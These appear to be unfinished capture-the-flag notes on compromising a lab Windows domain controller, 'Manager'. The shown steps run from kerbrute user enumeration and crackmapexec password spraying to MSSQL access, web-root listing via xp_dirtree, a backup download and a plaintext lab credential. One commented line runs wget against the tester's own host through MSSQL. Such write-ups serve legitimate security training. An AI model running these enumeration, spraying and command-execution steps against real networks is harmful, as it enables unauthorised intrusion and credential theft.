## Machine Manager : Medium - Windows 

## Notes :

- [*] : Ip Target : 10.10.11.236 

	Ports Open :			
		
		53 	tcp 	open 	domain  	syn-ack 	Simple DNS Plus  	  	 
		80 	tcp 	open 	http  	syn-ack 	Microsoft IIS httpd  	10.0  
		88 	tcp 	open 	kerberos-sec  	syn-ack 	Microsoft Windows Kerberos  	  	server time: 2024-03-06 04:19:43Z 
		135 	tcp 	open 	msrpc  	syn-ack 	Microsoft Windows RPC  	  	 
		139 	tcp 	open 	netbios-ssn  	syn-ack 	Microsoft Windows netbios-ssn  	  	 
		389 	tcp 	open 	ldap  	syn-ack 	Microsoft Windows Active Directory LDAP  	  	Domain: manager.htb0., Site: Default-First-Site-Name 
		445 	tcp 	open 	microsoft-ds  	syn-ack 	  	  	 
		593 	tcp 	open 	ncacn_http  	syn-ack 	Microsoft Windows RPC over HTTP  	1.0  	 
		636 	tcp 	open 	ldap  	syn-ack 	Microsoft Windows Active Directory LDAP  	  	Domain: manager.htb0., Site: Default-First-Site-Name 
		1433 	tcp 	open 	ms-sql-s  	syn-ack 	Microsoft SQL Server 2019  	15.00.2000.00; RTM  	 
		
		And many more ...but we will focus on this first
		
- [*] : >> Port 80 resolved into nothing 

	>> smbclient -N -L //10.10.11.236

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

	>> kerberos also open : will kerbrute for sure ...
	
	kerbrute userenum /usr/share/wordlists/Seclists/Usernames/xato-net-10-million-usernames-dup.txt -d manager.htb --dc manager.htb 
	
	>> enum4linux -> 
	Server 10.10.11.236 allows sessions using username '', password ''    
	Domain Name: MANAGER                                                                                                
	Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
	
	kerbrute
			2024/03/05 23:02:01 >  [+] VALID USERNAME:       ryan@manager.htb
			2024/03/05 23:02:04 >  [+] VALID USERNAME:       guest@manager.htb
			2024/03/05 23:02:05 >  [+] VALID USERNAME:       cheng@manager.htb
			2024/03/05 23:02:06 >  [+] VALID USERNAME:       raven@manager.htb
			2024/03/05 23:02:14 >  [+] VALID USERNAME:       administrator@manager.htb
			2024/03/05 23:02:27 >  [+] VALID USERNAME:       Ryan@manager.htb
			2024/03/05 23:02:33 >  [+] VALID USERNAME:       Raven@manager.htb
			2024/03/05 23:02:44 >  [+] VALID USERNAME:       operator@manager.htb
			2024/03/05 23:03:51 >  [+] VALID USERNAME:       Guest@manager.htb
			2024/03/05 23:03:51 >  [+] VALID USERNAME:       Administrator@manager.htb
			2024/03/05 23:04:46 >  [+] VALID USERNAME:       Cheng@manager.htb
			2024/03/05 23:07:11 >  [+] VALID USERNAME:       jinwoo@manager.htb
			2024/03/05 23:07:33 >  [+] VALID USERNAME:       RYAN@manager.htb
			2024/03/05 23:08:50 >  [+] VALID USERNAME:       RAVEN@manager.htb
			2024/03/05 23:08:53 >  [+] VALID USERNAME:       GUEST@manager.htb
			2024/03/05 23:10:55 >  [+] VALID USERNAME:       Operator@manager.htb
			2024/03/05 23:26:57 >  [+] VALID USERNAME:       OPERATOR@manager.htb


	>> winrm : 
	crackmapexec winrm 10.10.11.236 -u usernames.txt -p usernames.txt --> resolved into nothing 

	SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
	HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
	WINRM       10.10.11.236    5985   DC01             [-] manager.htb\ryan:ryan
	... 

	>> http://10.10.11.236:5985/wsman dirsearch _-> resolved into nothing 
	
	 
	>> smb :
	└─$ crackmapexec smb manager.htb -u usernames.txt -p usernames.txt  

	SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator 
	
	smbclient  //10.10.11.236/sysvol  -U operator  --> resolved into nothing 
	Password for [WORKGROUP\operator]:
	Try "help" to get a list of possible commands.
	smb: \> le
	le: command not found
	smb: \> ls
	  .                                   D        0  Thu Jul 27 11:19:07 2023
	  ..                                  D        0  Thu Jul 27 11:19:07 2023
  	manager.htb  --> resolved into nothing 
	

	>>  crackmapexec mssql 10.10.11.236 -u operator -p operator ##didnt work -> -X 'wget 10.10.14.56:80' ##
/home/kali/.local/lib/python3.11/site-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
	
	    Impacket ->
	    usr/share/doc/python3-impacket/examples/mssqlclient.py -port 1433 manager.htb/operator:operator@10.10.11.236 -windows-auth
	    
	    SQL (MANAGER\Operator  guest@master)> EXEC sp_configure 'show advanced options', 1
[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
SQL (MANAGER\Operator  guest@master)> EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   


SQL (MANAGER\Operator  guest@tempdb)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonate
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
    
SQL (MANAGER\Operator  guest@tempdb)> use master
		[*] ENVCHANGE(DATABASE): Old Value: tempdb, New Value: master
		[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
		SQL (MANAGER\Operator  guest@master)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
		TABLE_NAME         
		----------------   
		spt_fallback_db    

		spt_fallback_dev   

		spt_fallback_usg   

		spt_monitor        


	SQL (MANAGER\Operator  guest@tempdb)> 
		EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1; ## CHECK HACKTICKS MSSQL
		
			subdirectory                      depth   file   
			-------------------------------   -----   ----   
			about.html                            1      1   

			contact.html                          1      1   

			css                                   1      0   

			images                                1      0   

			index.html                            1      1   

			js                                    1      0   

			service.html                          1      1   

			web.config                            1      1   

			website-backup-27-07-23-old.zip       1      1   
			
	&& wget 10.10.11.236/website-backup-27-07-23-old.zip

	>> raven creds in xml file :
	raven@manager.htb
	R4v3nBe5tD3veloP3r!123
	    
	    
- [*] : 


	>> 

- [*] : 
	>> 

- [*] : 
	>> 

	
